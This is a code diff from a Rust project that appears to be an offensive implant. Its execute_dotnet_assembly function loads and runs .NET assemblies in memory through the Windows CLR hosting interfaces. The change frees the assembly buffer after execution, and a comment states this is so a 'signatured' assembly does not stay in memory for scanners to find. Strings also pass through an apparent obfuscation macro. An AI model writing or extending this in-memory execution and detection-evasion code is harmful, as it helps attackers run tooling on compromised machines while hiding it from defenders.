@@ -9,7 +9,7 @@ use windows_sys::{
             ClrHosting::{CLRCreateInstance, CorRuntimeHost},
             Com::SAFEARRAY,
             Ole::{
-                SafeArrayAccessData, SafeArrayCreateVector, SafeArrayPutElement,
+                SafeArrayAccessData, SafeArrayCreateVector, SafeArrayDestroy, SafeArrayPutElement,
                 SafeArrayUnaccessData,
             },
             Variant::{VARIANT, VT_ARRAY, VT_BSTR, VT_UI1, VT_VARIANT},
@@ -223,7 +223,10 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<String, Dotnet
     let vt = unsafe { &(*(*entryp).vtable) };
     unsafe { (vt.Invoke_3)(entryp as *mut _, object, p_args, &mut retval) };
 
-    Ok(sc!("Dotnet task running", 49).unwrap())
+    // Dont leave the (probably) signatured dotnet asm in memory
+    unsafe { SafeArrayDestroy(p_sa) };
+
+    Ok(sc!("Dotnet task complete and unloaded from memory", 49).unwrap())
 }
 
 fn make_params(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
